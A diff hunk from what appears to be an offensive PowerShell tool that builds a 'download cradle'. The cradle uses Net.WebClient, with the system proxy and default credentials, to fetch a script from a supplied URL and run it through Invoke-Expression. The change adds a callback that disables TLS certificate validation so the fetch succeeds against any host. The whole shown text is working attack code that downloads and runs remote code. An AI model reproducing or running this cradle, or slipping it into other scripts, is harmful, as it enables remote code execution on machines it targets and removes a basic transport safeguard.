@@ -58,7 +58,7 @@ Param
 )
 
     Write-Verbose "[*] Creating Download Cradle script using $url"
-    $DownloadCradle ='$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('''+$url+''');'
+    $DownloadCradle ='[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('''+$url+''');'
     
     Write-Verbose "[*] Figuring out if we're starting from a 32bit or 64bit process.."
     if([IntPtr]::Size -eq 4)
